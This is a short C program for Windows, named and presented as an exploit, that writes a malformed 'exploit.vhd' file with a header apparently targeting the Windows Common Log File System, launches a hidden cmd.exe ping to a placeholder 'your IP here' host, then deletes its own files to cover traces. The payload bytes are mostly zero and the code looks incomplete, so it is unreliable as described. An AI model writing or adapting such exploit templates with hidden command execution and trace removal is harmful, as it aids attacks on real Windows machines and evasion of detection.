#include <windows.h>
#include <stdio.h>

int main() {
    const char *dir = "C:\\temp\\LOTUSorg\\";
    const char *file = "C:\\temp\\LOTUSorg\\exploit.vhd";

    CreateDirectoryA(dir, NULL);

    FILE *fp = fopen(file, "wb");
    if (fp) {
        char corruptPayload[512] = {
            0x63, 0x6C, 0x66, 0x73, 
            0x00, 0x01, 0x00, 0x00, 
        };
        fwrite(corruptPayload, sizeof(corruptPayload), 1, fp);
        fclose(fp);
    }

    ShellExecuteA(NULL, "open", "cmd.exe", "/c ping TU.IP.AQUÍ -n 1", NULL, SW_HIDE);

    Sleep(3000);
  
    DeleteFileA(file);
    RemoveDirectoryA(dir);

    return 0;
}
